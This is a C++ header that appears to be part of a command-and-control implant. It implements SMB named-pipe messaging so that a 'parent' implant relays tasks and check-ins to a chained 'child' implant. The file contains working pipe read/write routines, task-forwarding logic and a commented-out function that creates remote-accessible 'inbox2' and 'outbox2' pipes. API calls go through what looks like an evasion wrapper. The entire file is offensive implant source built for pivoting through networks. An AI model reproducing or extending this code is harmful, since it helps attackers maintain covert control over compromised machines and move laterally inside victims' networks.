/*

SMB Comms

Need:

(listener)
- [ ] Setup pipes (sets up smb pipes)

(both)
- [ ] Read pipe
- [ ] Write pipe

and an internal chain map that tells what my implant is connected to, and what to send to/relay tasks to (later)

*/
//temp as .h for now
#pragma once

#include <windows.h>
#include <iostream>
#include <vector>
#include <queue>
#include <mutex>
#include "comms/queues.h"
#include "_debug/debug.h"
#include "defense/winapi.h"
//Awaits for a parent to connect to the pipe. IF we don't have this, we get an immediate
//536 pipe error: Waiting for a process to open the other end of the pipe.




//for routing to smb
namespace SMB {

    //generic pipe reader to dynamically read the pipe
    DWORD read_pipe_dynamic(HANDLE h_pipe, std::vector<uint8_t>& out_buffer) {
        const DWORD CHUNK_SIZE = 8192;
        std::vector<uint8_t> chunk(CHUNK_SIZE);
        DWORD bytes_read = 0;

        out_buffer.clear();

        while (true) {
            DEBUG_LOG("[SMB::read_pipe_dynamic]: Reading " << CHUNK_SIZE << " bytes from pipe");
            BOOL success = WinApi::ReadFile(h_pipe, chunk.data(), CHUNK_SIZE, &bytes_read, NULL);
            DWORD err = WinApi::GetLastError();

            // Append whatever was just read to the master buffer
            if (bytes_read > 0) {
                out_buffer.insert(out_buffer.end(), chunk.begin(), chunk.begin() + bytes_read);
            }

            if (success) {
                // ReadFile returned TRUE. The entire message has been read.
                DEBUG_LOG("[SMB::read_pipe_dynamic]: Transfer Complete");
                break;
            }

            if (!success && err == ERROR_MORE_DATA) {
                // The buffer was too small. The data is appended, loop and read the rest.
                continue;
            }

            // If any other error occurs (like ERROR_BROKEN_PIPE), bail out
            DEBUG_LOG("[SMB::read_pipe_dynamic] Error occured: "<< err);
            return err;
        }

        return ERROR_SUCCESS;
    }


    /*
    If we are the child.... these are the funcs we want
    
    */
    namespace Child {
        bool await_client_connection(HANDLE h_pipe, const std::string& pipe_name) {
            DEBUG_LOG("[SMB::Child::await_client_connection]: Waiting for parent to connect to " << pipe_name << " pipe...");

            // Synchronous block. It halts the thread here until the parent connects.
            BOOL connected = WinApi::ConnectNamedPipe(h_pipe, NULL);

            if (!connected && WinApi::GetLastError() != ERROR_PIPE_CONNECTED) {
                //std::cerr << "ConnectNamedPipe failed: " << GetLastError() << std::endl;
                DEBUG_LOG("[SMB::Child::await_client_connection]: Connecting to pipe failed: " << WinApi::GetLastError());
                return false;
            }

            DEBUG_LOG("[SMB::Child::await_client_connection]: Parent connected to " << pipe_name << "!");
            return true;
        }

        //in comms.h now
        // int register_pipe(HANDLE& h_inbox_pipe, HANDLE& h_outbox_pipe) {
        //     std::wstring wstr_pipe_inbox = L"\\\\.\\pipe\\inbox2";

        //     DEBUG_LOG("[SMB::Child::register_pipe]: Attempting to register pipe" << std::string(wstr_pipe_inbox.begin(), wstr_pipe_inbox.end()));

        //     // STRIPPED: FILE_FLAG_OVERLAPPED
        //     h_inbox_pipe = WinApi::CreateNamedPipeW(
        //         wstr_pipe_inbox.c_str(),
        //         PIPE_ACCESS_INBOUND,
        //         PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT | PIPE_ACCEPT_REMOTE_CLIENTS,
        //         1, 4096, 4096, 0, NULL
        //     );

        //     if (h_inbox_pipe == INVALID_HANDLE_VALUE) {
        //         DEBUG_LOG("[SMB::Child::register_pipe]: Pipe registration failed: " << std::string(wstr_pipe_inbox.begin(), wstr_pipe_inbox.end()) << " Error: " << WinApi::GetLastError());
        //         return 1;
        //     }
        //     DEBUG_LOG("[SMB::Child::register_pipe]: Pipe registered successfully: " << std::string(wstr_pipe_inbox.begin(), wstr_pipe_inbox.end()));

        //     std::wstring wstr_pipe_outbox = L"\\\\.\\pipe\\outbox2";

        //     DEBUG_LOG("[SMB::Child::register_pipe]: Attempting to register pipe" << std::string(wstr_pipe_outbox.begin(), wstr_pipe_outbox.end()));

        //     // STRIPPED: FILE_FLAG_OVERLAPPED
        //     h_outbox_pipe = WinApi::CreateNamedPipeW(
        //         wstr_pipe_outbox.c_str(),
        //         PIPE_ACCESS_OUTBOUND,
        //         PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT | PIPE_ACCEPT_REMOTE_CLIENTS,
        //         1, 4096, 4096, 0, NULL
        //     );

        //     if (h_outbox_pipe == INVALID_HANDLE_VALUE) {
        //         DEBUG_LOG("[SMB::Child::register_pipe]: Pipe registration failed: " <<std::string(wstr_pipe_outbox.begin(), wstr_pipe_outbox.end()) << " Error: " << WinApi::GetLastError());
        //         return 1;
        //     }

        //     // Await connection for both pipes
        //     if (!await_client_connection(h_inbox_pipe, "INBOX")) return 1;
        //     if (!await_client_connection(h_outbox_pipe, "OUTBOX")) return 1;

        //     return 0;
        // }
    
        std::vector<uint8_t> fetch_tasks(HANDLE h_inbox, HANDLE h_outbox, const std::vector<uint8_t>& get_request_payload) {
            DWORD bytes_written = 0;
            DEBUG_LOG("[SMB::Child::fetch_tasks]: Fetching Tasks");
            // Write the GET request up to the Parent
            if (!WinApi::WriteFile(h_outbox, get_request_payload.data(), static_cast<DWORD>(get_request_payload.size()), &bytes_written, NULL)) {
                DEBUG_LOG("[SMB::Child::fetch_tasks]: Write Error: " << WinApi::GetLastError());
                return {};
            }

            // Read the response from the Parent using the dynamic helper
            std::vector<uint8_t> inbound_buffer;
            DWORD read_status = read_pipe_dynamic(h_inbox, inbound_buffer);

            if (read_status == ERROR_SUCCESS && !inbound_buffer.empty()) {
                DEBUG_LOG("[SMB::Child::fetch_tasks]: Retrieved data from parent");
                return inbound_buffer;
            }

            DEBUG_LOG("[SMB::Child::fetch_tasks]: No data from parent, inbound buffer was empty, or a failed read");
            return {};
        }

        bool send_data(HANDLE h_outbox, const std::vector<uint8_t>& payload) {
            if (payload.empty() || h_outbox == INVALID_HANDLE_VALUE) {
                DEBUG_LOG("[SMB::Child::send_data]: Payload empty or outbox handle is invalid: " << WinApi::GetLastError());
                return false;
            }

            DWORD bytes_written = 0;
            if (!WinApi::WriteFile(h_outbox, payload.data(), static_cast<DWORD>(payload.size()), &bytes_written, NULL)) {
                DEBUG_LOG("[SMB::Child::send_data]: Immediate pipe write error: " << WinApi::GetLastError());
                return false;
            }

            DEBUG_LOG("[SMB::Child::send_data]: Instantly sent " << bytes_written << " bytes to parent.");
            return true;
        }


    }

    /*
    If we are the parent... these are the funcs we want
    
    */
    namespace Parent { //rename cycle child
                
        nlohmann::json cycle_child(HANDLE h_write, HANDLE h_read, const nlohmann::json& raw_task, bool expect_response) {
            /*
            Cycle the SMB child.

            This:
             1. Gets the current GET task sitting in the SMB outbox pipe.
                > pushes to GET queue
             2. Pushes the passed in task *to* the inbox of the child.
             3. gets the response from the child in the outbox pipe.
                > Pushes result to POST queue
            */
            DEBUG_LOG("[SMB::Parent::cycle_child]: Interacting with child implant");

            std::vector<uint8_t> inbound_buffer;

            // 1. Wait for and read the child check-in (GET request)
            DWORD read_status = read_pipe_dynamic(h_read, inbound_buffer);

            if (read_status == ERROR_SUCCESS && !inbound_buffer.empty()) {
                try {
                    nlohmann::json get_from_child = nlohmann::json::from_msgpack(inbound_buffer);
                    GetQueue::push(get_from_child);
                }
                catch (const std::exception& e) {
                    DEBUG_LOG("[SMB::Parent::cycle_child]: MsgPack unpack failed on child check-in: " << e.what());
                    return nlohmann::json{};
                }
            }
            else {
                // read_pipe_dynamic returns the exact error code now, no need for GetLastError()
                DEBUG_LOG("ReadFile failed on child check-in. Error: " << read_status);

                return nlohmann::json{};
            }

            // 2. Package and forward the task to the child
            nlohmann::json task_list = nlohmann::json::array();
            task_list.push_back(raw_task);

            std::vector<uint8_t> msgpack_payload;
            try {
                msgpack_payload = nlohmann::json::to_msgpack(task_list);
            }
            catch (const std::exception& e) {
                DEBUG_LOG("[SMB::Parent::cycle_child]: MsgPack unpack failed on task serialization: " << e.what());
                return nlohmann::json{};
            }

            DWORD bytes_written = 0;
            if (!WinApi::WriteFile(h_write, msgpack_payload.data(), static_cast<DWORD>(msgpack_payload.size()), &bytes_written, NULL)) {
                DEBUG_LOG("[SMB::Parent::cycle_child]: WriteFile failed sending task to child. Error: " << WinApi::GetLastError());
                return nlohmann::json{};
            }

            if (!expect_response) {
                return nlohmann::json{};
            }

            // 3. Wait for and read the task execution response
            inbound_buffer.clear(); // Important: clear the buffer before reusing it!
            read_status = read_pipe_dynamic(h_read, inbound_buffer);

            if (read_status == ERROR_SUCCESS && !inbound_buffer.empty()) {
                try {
                    return nlohmann::json::from_msgpack(inbound_buffer);
                }
                catch (const std::exception& e) {
                    DEBUG_LOG("[SMB::Parent::cycle_child]: MsgPack unpack failed on task response" << e.what());
                    return nlohmann::json{};
                }
            }
            else {
                DEBUG_LOG("[SMB::Parent::cycle_child]: ReadFile failed on task response. Error: " << read_status);
                return nlohmann::json{};
            }
        }
    }
}
